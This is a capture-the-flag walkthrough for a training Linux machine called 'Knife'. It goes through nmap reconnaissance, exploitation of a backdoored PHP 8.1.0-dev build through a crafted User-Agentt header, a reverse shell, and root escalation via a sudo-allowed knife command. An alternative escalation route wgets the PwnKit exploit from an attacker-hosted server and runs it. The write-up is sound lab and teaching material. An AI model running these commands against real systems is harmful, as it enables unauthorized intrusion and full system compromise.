Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.10.242 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn
```

![All Ports](/assets/Knife/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.242 -p 22,80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![Services](/assets/Knife/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.2p1**
+ **80/tcp Apache httpd 2.4.41**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.242 -p 22,80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn -v
```

<br />
<br />
<br />

We only detect a **DoS vulnerability** for the **http service**, which is not useful.

<br />

<br />
### Foothold

I think this machine is pretty **beginner-friendly**, as we can solve it basically by enumerating and searching for exploits, however we have to understand what we are doing.

<br />

The first thing that revealed a vulnerability was the **technologies enumeration**:

```bash
whatweb http://10.10.10.242 > whatweb.txt
```

![Whatweb](/assets/Knife/4.png)
<br />
<br />
<br />

The version of PHP is definitely noteworthy, **8.1.0-dev**, the *-dev* suffix is not common in production environments, which leads me to search for a vulnerability using searchsploit:

```bash
searchsploit PHP 8.1.0-dev
```

![Searchsploit](/assets/Knife/5.png)
<br />
<br />
<br />

We can see an exploit that perfectly fits our version, so let's read it and try to replicate it:
![Exploit](/assets/Knife/6.png)
<br />
<br />
<br />

It seems that the script sends an HTTP request in which there is an uncommon header, *User-Agentt*, in which we can use the function `zerodiumsystem()` to **execute a command**, which output is printed before the *<!DOCTYPE html>* tag. Let's try it using BurpSuite:

![whoami](/assets/Knife/7.png)
<br />
<br />
<br />

It's working like a charm, let's send us a **reverse shell**:
```bash
rlwrap nc -nlvp 4444
```

![RevShell](/assets/Knife/8.png)
<br />
<br />
<br />

Let's print the flag and go for the privilege escalation:

<br />
### Privilege Escalation
For this machine, I discovered **two ways to escalate privileges**, the conventional one and an alternative one.

<br />
#### Conventional Privilege Escalation
Enumerating the system, I discovered that we are able to run the `knife` command as sudo without requiring a password:
```bash
sudo -l
```

![sudo](/assets/Knife/10.png)
<br />
<br />
<br />

A glimpse at [GTFOBins](https://gtfobins.github.io/gtfobins/knife/) uncovered the way:
```
sudo knife exec -E 'exec "/bin/bash"'
```
![knifeprivesc](/assets/Knife/11.png)
<br />
<br />
<br />

Now we just have to print the flag:
<br />
![RootOwn](/assets/Knife/12.png)

<br />
#### Alternative Privilege Escalation
The alternative privilege escalation method works through **CVE-2021-4034**, which is based on giving **SUID permission to an old version of the pkexec binary**:

```bash
find / -perm -4000 -ls 2>/dev/null
```

<br />
<br />
<br />

To exploit this vulnerability I used the [PwnKit](https://github.com/ly4k/PwnKit) created by **ly4k**, we just have to download it in our machine:

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
sudo python3 -m http.server 80
```
<br />

And then **transfer it to the target machine and run it**:

```bash
wget http://10.10.16.8/PwnKit
chmod +x PwnKit
./PwnKit
```

![PwnKit](/assets/Knife/14.png)
<br />
<br />
<br />

Now we just have to print the flag:
<br />
